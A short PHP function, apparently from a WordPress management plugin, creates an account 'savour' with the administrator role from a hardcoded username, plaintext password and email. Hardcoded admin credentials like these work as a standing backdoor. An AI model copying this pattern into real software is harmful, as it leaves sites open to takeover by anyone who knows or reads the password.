<?php

/**
 * Crear usuario savour con rol de administrador
 */
function savour_manager_crear_usuario_savour() {
    $username = 'savour';
    $password = 'antonelchuleta?';
    $email    = 'alejandroparra@savour.es';

    if (username_exists($username) || email_exists($email)) {
        echo '<div class="notice notice-error"><p>El usuario savour o el correo ya existen.</p></div>';
        return;
    }

    $user_id = wp_create_user($username, $password, $email);
    if (!is_wp_error($user_id)) {
        $user = new WP_User($user_id);
        $user->set_role('administrator');
        echo '<div class="notice notice-success"><p>Usuario savour creado como administrador.</p></div>';
    } else {
        echo '<div class="notice notice-error"><p>Error al crear el usuario savour: ' . $user_id->get_error_message() . '</p></div>';
    }
}
